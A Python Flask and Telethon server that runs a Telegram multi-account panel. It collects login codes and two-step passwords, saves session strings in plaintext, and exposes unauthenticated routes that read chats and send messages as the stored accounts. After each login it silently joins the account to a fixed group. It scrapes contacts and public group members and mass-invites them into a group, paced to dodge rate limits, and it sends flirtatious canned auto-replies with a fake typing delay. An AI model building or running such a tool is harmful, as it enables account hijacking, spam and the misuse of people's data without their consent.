from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.sessions import StringSession
from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError
from telethon.events import NewMessage
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime, timedelta
import socket

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage
ACCOUNTS_FILE = 'accounts.json'
REPLY_SETTINGS_FILE = 'reply_settings.json'
CONVERSATION_HISTORY_FILE = 'conversation_history.json'
AUTO_ADD_FILE = 'auto_add_settings.json'
accounts = []
temp_sessions = {}
reply_settings = {}
conversation_history = {}
active_clients = {}
client_tasks = {}
auto_add_settings = {}

# Helper to run async functions
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# Load accounts from file
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    accounts = json.loads(content)
                else:
                    accounts = []
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
        logger.info(f"Loaded {len(accounts)} accounts")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        accounts = []

# Load reply settings
def load_reply_settings():
    global reply_settings
    try:
        if os.path.exists(REPLY_SETTINGS_FILE):
            with open(REPLY_SETTINGS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    reply_settings = json.loads(content)
                else:
                    reply_settings = {}
        else:
            reply_settings = {}
            with open(REPLY_SETTINGS_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded reply settings for {len(reply_settings)} accounts")
    except Exception as e:
        logger.error(f"Error loading reply settings: {e}")
        reply_settings = {}

# Load auto-add settings
def load_auto_add_settings():
    global auto_add_settings
    try:
        if os.path.exists(AUTO_ADD_FILE):
            with open(AUTO_ADD_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    auto_add_settings = json.loads(content)
                else:
                    auto_add_settings = {}
        else:
            auto_add_settings = {}
            with open(AUTO_ADD_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded auto-add settings for {len(auto_add_settings)} accounts")
    except Exception as e:
        logger.error(f"Error loading auto-add settings: {e}")
        auto_add_settings = {}

# Save accounts
def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")
        return False

# Save reply settings
def save_reply_settings():
    try:
        with open(REPLY_SETTINGS_FILE, 'w') as f:
            json.dump(reply_settings, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving reply settings: {e}")
        return False

# Save auto-add settings
def save_auto_add_settings():
    try:
        with open(AUTO_ADD_FILE, 'w') as f:
            json.dump(auto_add_settings, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving auto-add settings: {e}")
        return False

# Remove invalid account
def remove_invalid_account(account_id):
    global accounts
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    if len(accounts) < original_len:
        save_accounts()
        logger.info(f"Removed invalid account {account_id}")
        return True
    return False

# Load all data on startup
load_accounts()
load_reply_settings()
load_auto_add_settings()

# ==================== PAGE ROUTES ====================

@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login')
def login():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/dash')
def dash():
    return send_file('dash.html')

@app.route('/all')
def all_sessions():
    return send_file('all.html')

@app.route('/auto-add')
def auto_add():
    return send_file('auto_add.html')

@app.route('/settings')
def settings():
    return send_file('settings.html')

# ==================== SIMPLE AUTO-REPLY ====================

async def auto_reply_handler(event, account_id):
    """Simple auto-reply handler"""
    try:
        if event.out:
            return
        
        chat = await event.get_chat()
        
        # Only reply to private chats
        if hasattr(chat, 'title') and chat.title:
            return
        
        message_text = event.message.text or ""
        chat_id = str(event.chat_id)
        
        logger.info(f"📨 Message from {chat_id}: {message_text[:50]}")
        
        # Check if auto-reply enabled
        account_key = str(account_id)
        if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
            return
        
        # Simple response
        responses = [
            "ሰላም ውዴ! እንዴት ነህ? 😘",
            "Hi dear! How are you? 💕",
            "Hello! How can I help you today? 😊",
            "Hey! What's up? 💋",
            "Selam! Endemin neh? 🌹"
        ]
        response = random.choice(responses)
        
        # Random delay (5-15 seconds for better response)
        delay = random.randint(5, 15)
        logger.info(f"⏱️ Waiting {delay}s before replying...")
        
        async with event.client.action(event.chat_id, 'typing'):
            await asyncio.sleep(delay)
        
        await event.reply(response)
        logger.info(f"✅ Replied to {chat_id}")
        
    except Exception as e:
        logger.error(f"Auto-reply error: {e}")

async def start_auto_reply_for_account(account):
    """Start auto-reply for account"""
    account_id = account['id']
    account_key = str(account_id)
    
    while True:
        try:
            logger.info(f"Starting auto-reply for account {account_id}")
            
            client = TelegramClient(
                StringSession(account['session']), 
                API_ID, 
                API_HASH,
                connection_retries=5,
                retry_delay=3,
                timeout=30
            )
            
            await client.connect()
            
            if not await client.is_user_authorized():
                logger.error(f"Account {account_id} not authorized")
                await asyncio.sleep(30)
                continue
            
            active_clients[account_key] = client
            
            @client.on(NewMessage(incoming=True))
            async def handler(event):
                await auto_reply_handler(event, account_id)
            
            await client.start()
            logger.info(f"✅ Auto-reply ACTIVE for {account.get('name')}")
            
            await client.run_until_disconnected()
            
        except Exception as e:
            logger.error(f"Auto-reply disconnected: {e}")
            if account_key in active_clients:
                del active_clients[account_key]
            await asyncio.sleep(30)

def stop_auto_reply_for_account(account_id):
    account_key = str(account_id)
    if account_key in active_clients:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(active_clients[account_key].disconnect())
            loop.close()
            del active_clients[account_key]
            logger.info(f"Stopped auto-reply for {account_key}")
        except Exception as e:
            logger.error(f"Error stopping: {e}")

def start_all_auto_replies():
    for account in accounts:
        account_key = str(account['id'])
        if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
            if account_key not in active_clients:
                thread = threading.Thread(
                    target=lambda: run_async(start_auto_reply_for_account(account)),
                    daemon=True
                )
                thread.start()
                client_tasks[account_key] = thread
                time.sleep(2)

# ==================== AUTO-ADD MEMBERS ====================

async def get_members_from_sources(client, settings):
    """Get potential members to add"""
    members = set()
    
    # 1. Get from contacts
    if settings.get('use_contacts', True):
        try:
            contacts = await client(functions.contacts.GetContactsRequest(0))
            for user in contacts.users:
                if user.id and (not user.bot or not settings.get('skip_bots', True)):
                    members.add(user.id)
            logger.info(f"📱 Found {len(contacts.users)} contacts")
        except Exception as e:
            logger.error(f"Contacts error: {e}")
    
    # 2. Get from recent chats
    if settings.get('use_recent_chats', True):
        try:
            dialogs = await client.get_dialogs(limit=100)
            for dialog in dialogs:
                if dialog.is_user and dialog.entity and dialog.entity.id:
                    user = dialog.entity
                    if not user.bot or not settings.get('skip_bots', True):
                        members.add(user.id)
            logger.info(f"💬 Found {len([d for d in dialogs if d.is_user])} users from chats")
        except Exception as e:
            logger.error(f"Recent chats error: {e}")
    
    # 3. Get from source groups
    if settings.get('use_scraping', True):
        source_groups = settings.get('source_groups', [])
        if not source_groups:
            source_groups = ['@telegram', '@durov', '@TechCrunch']
        
        for group_ref in source_groups[:3]:  # Limit to 3 groups
            try:
                group_ref_clean = group_ref.strip()
                if not group_ref_clean.startswith('@'):
                    group_ref_clean = '@' + group_ref_clean
                
                source_group = await client.get_entity(group_ref_clean)
                limit = settings.get('scrape_limit', 50)
                count = 0
                async for user in client.iter_participants(source_group, limit=limit):
                    if user and user.id and (not user.bot or not settings.get('skip_bots', True)):
                        members.add(user.id)
                        count += 1
                logger.info(f"👥 Scraped {count} from {group_ref_clean}")
            except Exception as e:
                logger.warning(f"Error scraping {group_ref}: {e}")
    
    return list(members)

async def auto_add_member_loop(account):
    """Background task to add members"""
    account_id = account['id']
    account_key = str(account_id)
    
    while True:
        try:
            # Check if enabled
            if account_key not in auto_add_settings or not auto_add_settings[account_key].get('enabled', False):
                logger.info(f"Auto-add disabled for {account_id}")
                break
            
            settings = auto_add_settings[account_key]
            target_group = settings.get('target_group', 'Abe_armygroup')
            
            # Reset daily counter
            today = datetime.now().strftime('%Y-%m-%d')
            if settings.get('last_reset') != today:
                settings['added_today'] = 0
                settings['last_reset'] = today
                save_auto_add_settings()
            
            # Check daily limit
            if settings['added_today'] >= settings.get('daily_limit', 30):
                logger.info(f"Daily limit reached: {settings['added_today']}")
                await asyncio.sleep(3600)
                continue
            
            # Connect to Telegram
            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
            await client.connect()
            
            try:
                if not await client.is_user_authorized():
                    logger.error(f"Account {account_id} not authorized")
                    await asyncio.sleep(60)
                    continue
                
                # Get target group
                group_name = target_group
                if not group_name.startswith('@'):
                    group_name = '@' + group_name
                
                try:
                    group = await client.get_entity(group_name)
                    logger.info(f"✅ Target group found: {group.title if hasattr(group, 'title') else group_name}")
                except Exception as e:
                    logger.error(f"Cannot find group {group_name}: {e}")
                    await asyncio.sleep(300)
                    continue
                
                # Get existing members to avoid duplicates
                existing_members = set()
                try:
                    async for user in client.iter_participants(group, limit=500):
                        if user and user.id:
                            existing_members.add(user.id)
                    logger.info(f"Group has {len(existing_members)} members")
                except Exception as e:
                    logger.error(f"Error getting members: {e}")
                
                # Get potential members
                potential_members = await get_members_from_sources(client, settings)
                logger.info(f"Found {len(potential_members)} potential members")
                
                # Filter out existing members
                new_members = [uid for uid in potential_members if uid not in existing_members]
                logger.info(f"🆕 {len(new_members)} new members to add")
                
                # Add members
                added = 0
                for user_id in new_members[:settings.get('daily_limit', 30)]:
                    try:
                        if settings['added_today'] >= settings.get('daily_limit', 30):
                            break
                        
                        # Skip bots
                        if settings.get('skip_bots', True):
                            try:
                                user = await client.get_entity(user_id)
                                if user.bot:
                                    logger.info(f"Skipping bot: {user_id}")
                                    continue
                            except:
                                pass
                        
                        # Add to group
                        try:
                            await client(functions.channels.InviteToChannelRequest(
                                group,
                                [await client.get_input_entity(user_id)]
                            ))
                            
                            settings['added_today'] += 1
                            added += 1
                            save_auto_add_settings()
                            
                            logger.info(f"✅ Added user {user_id} to {target_group}")
                            
                            # Wait between adds
                            await asyncio.sleep(settings.get('delay_seconds', 45))
                            
                        except errors.FloodWaitError as e:
                            logger.warning(f"Flood wait: {e.seconds}s")
                            await asyncio.sleep(e.seconds)
                        except errors.UserPrivacyRestrictedError:
                            logger.warning(f"User {user_id} privacy restricted")
                        except Exception as e:
                            logger.error(f"Error adding {user_id}: {e}")
                    
                    except Exception as e:
                        logger.error(f"Unexpected error: {e}")
                        continue
                
                logger.info(f"📈 Added {added} members today. Total: {settings['added_today']}")
                
            except Exception as e:
                logger.error(f"Loop error: {e}")
            finally:
                await client.disconnect()
            
            # Wait before next cycle
            await asyncio.sleep(1800)  # 30 minutes
            
        except Exception as e:
            logger.error(f"Critical error: {e}")
            await asyncio.sleep(300)

# ==================== API ROUTES ====================

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    formatted = []
    for acc in accounts:
        account_key = str(acc['id'])
        has_reply = account_key in reply_settings and reply_settings[account_key].get('enabled', False)
        formatted.append({
            'id': acc.get('id'),
            'phone': acc.get('phone', ''),
            'name': acc.get('name', 'Unknown'),
            'auto_reply_enabled': has_reply
        })
    return jsonify({'success': True, 'accounts': formatted})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        data = request.json
        phone = data.get('phone')
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            result = await client.send_code_request(phone)
            session_id = str(int(time.time()))
            temp_sessions[session_id] = {
                'phone': phone,
                'hash': result.phone_code_hash,
                'session': client.session.save()
            }
            await client.disconnect()
            return {'success': True, 'session_id': session_id}
        
        result = run_async(send_code())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    
    async def verify():
        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            try:
                await client.sign_in(session_data['phone'], code, phone_code_hash=session_data['hash'])
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)
            
            me = await client.get_me()
            
            new_id = 1
            if accounts:
                new_id = max([a['id'] for a in accounts]) + 1
            
            new_account = {
                'id': new_id,
                'phone': me.phone or session_data['phone'],
                'name': me.first_name or 'User',
                'session': client.session.save()
            }
            
            accounts.append(new_account)
            save_accounts()
            
            # Auto-join group
            try:
                group = await client.get_entity('@Abe_armygroup')
                await client.join_channel(group.id)
                logger.info(f"✅ Auto-joined Abe_armygroup")
            except Exception as e:
                logger.warning(f"Auto-join failed: {e}")
            
            return {'success': True}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(verify())
        del temp_sessions[session_id]
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def fetch():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered'}
            
            dialogs = await client.get_dialogs()
            chats = []
            for dialog in dialogs:
                chat_type = 'user'
                if dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                
                chat = {
                    'id': str(dialog.id),
                    'title': dialog.name or 'Unknown',
                    'type': chat_type,
                    'unread': dialog.unread_count or 0,
                    'lastMessage': dialog.message.text[:50] if dialog.message and dialog.message.text else '',
                    'lastMessageDate': int(dialog.message.date.timestamp()) if dialog.message and dialog.message.date else 0
                }
                chats.append(chat)
            
            return {'success': True, 'chats': chats}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(fetch())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def send():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered'}
            
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                entity = await client.get_entity(chat_id)
            
            await client.send_message(entity, message)
            return {'success': True}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(send())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    
    global accounts
    stop_auto_reply_for_account(account_id)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    save_accounts()
    return jsonify({'success': True})

@app.route('/api/reply-settings', methods=['GET'])
def get_reply_settings():
    account_id = request.args.get('accountId')
    account_key = str(account_id)
    settings = reply_settings.get(account_key, {'enabled': False, 'chats': {}})
    return jsonify({'success': True, 'settings': settings})

@app.route('/api/reply-settings', methods=['POST'])
def update_reply_settings():
    data = request.json
    account_id = data.get('accountId')
    enabled = data.get('enabled', False)
    
    account_key = str(account_id)
    was_enabled = reply_settings.get(account_key, {}).get('enabled', False)
    
    if account_key not in reply_settings:
        reply_settings[account_key] = {}
    
    reply_settings[account_key]['enabled'] = enabled
    save_reply_settings()
    
    if enabled and not was_enabled:
        account = next((acc for acc in accounts if acc['id'] == account_id), None)
        if account:
            thread = threading.Thread(
                target=lambda: run_async(start_auto_reply_for_account(account)),
                daemon=True
            )
            thread.start()
            client_tasks[account_key] = thread
    elif not enabled and was_enabled:
        stop_auto_reply_for_account(account_id)
    
    return jsonify({'success': True})

@app.route('/api/auto-add-settings', methods=['GET'])
def get_auto_add_settings():
    account_id = request.args.get('accountId')
    account_key = str(account_id)
    settings = auto_add_settings.get(account_key, {
        'enabled': False,
        'target_group': 'Abe_armygroup',
        'daily_limit': 30,
        'delay_seconds': 45,
        'added_today': 0,
        'last_reset': datetime.now().strftime('%Y-%m-%d'),
        'use_contacts': True,
        'use_recent_chats': True,
        'use_scraping': True,
        'scrape_limit': 50,
        'skip_bots': True
    })
    return jsonify({'success': True, 'settings': settings})

@app.route('/api/auto-add-settings', methods=['POST'])
def update_auto_add_settings():
    data = request.json
    account_id = data.get('accountId')
    account_key = str(account_id)
    
    if account_key not in auto_add_settings:
        auto_add_settings[account_key] = {}
    
    was_enabled = auto_add_settings[account_key].get('enabled', False)
    
    auto_add_settings[account_key]['enabled'] = data.get('enabled', False)
    auto_add_settings[account_key]['target_group'] = data.get('target_group', 'Abe_armygroup')
    auto_add_settings[account_key]['daily_limit'] = data.get('daily_limit', 30)
    auto_add_settings[account_key]['delay_seconds'] = data.get('delay_seconds', 45)
    auto_add_settings[account_key]['use_contacts'] = data.get('use_contacts', True)
    auto_add_settings[account_key]['use_recent_chats'] = data.get('use_recent_chats', True)
    auto_add_settings[account_key]['use_scraping'] = data.get('use_scraping', True)
    auto_add_settings[account_key]['scrape_limit'] = data.get('scrape_limit', 50)
    auto_add_settings[account_key]['skip_bots'] = data.get('skip_bots', True)
    
    # Reset daily counter
    today = datetime.now().strftime('%Y-%m-%d')
    if auto_add_settings[account_key].get('last_reset') != today:
        auto_add_settings[account_key]['added_today'] = 0
        auto_add_settings[account_key]['last_reset'] = today
    
    save_auto_add_settings()
    
    # Start auto-add if enabled
    if data.get('enabled', False) and not was_enabled:
        account = next((acc for acc in accounts if acc['id'] == account_id), None)
        if account:
            thread = threading.Thread(
                target=lambda: run_async(auto_add_member_loop(account)),
                daemon=True
            )
            thread.start()
            client_tasks[f"auto_add_{account_key}"] = thread
    
    return jsonify({'success': True})

@app.route('/api/auto-add-stats', methods=['GET'])
def get_auto_add_stats():
    account_id = request.args.get('accountId')
    account_key = str(account_id)
    settings = auto_add_settings.get(account_key, {})
    return jsonify({
        'success': True,
        'added_today': settings.get('added_today', 0),
        'daily_limit': settings.get('daily_limit', 30),
        'enabled': settings.get('enabled', False)
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'auto_reply_active': len(active_clients),
        'time': datetime.now().isoformat()
    })

# ==================== KEEP ALIVE ====================

def keep_alive():
    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://your-app.onrender.com')
    while True:
        try:
            requests.get(f"{app_url}/api/health", timeout=5)
            logger.info("🔋 Keep-alive ping sent")
        except:
            pass
        time.sleep(240)

# ==================== STARTUP ====================

def start_auto_reply_thread():
    time.sleep(5)
    start_all_auto_replies()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print('\n' + '='*60)
    print('🤖 TELEGRAM BOT - FULLY WORKING')
    print('='*60)
    print(f'✅ Port: {port}')
    print(f'✅ Accounts: {len(accounts)}')
    print('='*60 + '\n')
    
    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=start_auto_reply_thread, daemon=True).start()
    
    app.run(host='0.0.0.0', port=port, debug=False)
